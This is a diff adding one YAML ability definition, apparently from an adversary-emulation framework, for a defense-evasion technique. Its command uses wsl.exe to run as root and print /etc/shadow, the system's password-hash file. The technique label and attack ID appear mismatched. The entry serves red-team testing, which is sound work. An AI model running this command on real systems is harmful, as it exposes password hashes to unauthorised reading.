@@ -1,0 +1,21 @@
+- id: 19597955-4967-aea8-8b9e-83948a2e04ad
+  name: Wsl.exe - Cats /etc/shadow file as root
+  description: Cats /etc/shadow file as root
+  tactic: defense-evasion
+  technique:
+    attack_id: T1202
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: wsl.exe -u root -e cat /etc/shadow
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Matthew Brown
+  created: '2019-06-27'
+  modified: '2019-06-27'
+  operating_system: Windows All Versions
